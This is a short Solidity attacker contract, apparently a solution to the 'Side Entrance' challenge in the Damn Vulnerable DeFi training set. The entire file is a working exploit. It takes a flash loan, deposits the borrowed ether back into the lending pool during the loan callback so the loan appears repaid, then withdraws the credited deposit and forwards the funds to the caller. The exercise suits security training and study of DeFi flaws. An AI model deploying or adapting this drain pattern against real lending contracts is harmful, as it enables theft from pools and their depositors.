// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ISideEntranceLenderPool {
    function flashLoan(uint256 amount) external;
    function deposit() external payable;
    function withdraw() external;
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideEntranceLenderPoolAttacker {

    ISideEntranceLenderPool public immutable vulnerablePool;

    constructor(address pool){
        vulnerablePool = ISideEntranceLenderPool(pool);
    } 

    function flashLoan(uint256 amount) external {
        vulnerablePool.flashLoan(amount);
        vulnerablePool.withdraw();
        payable(msg.sender).call{value:amount}("");
    }

    function execute() external payable {
        vulnerablePool.deposit{value: address(this).balance}();
    }

    receive() external payable {}
}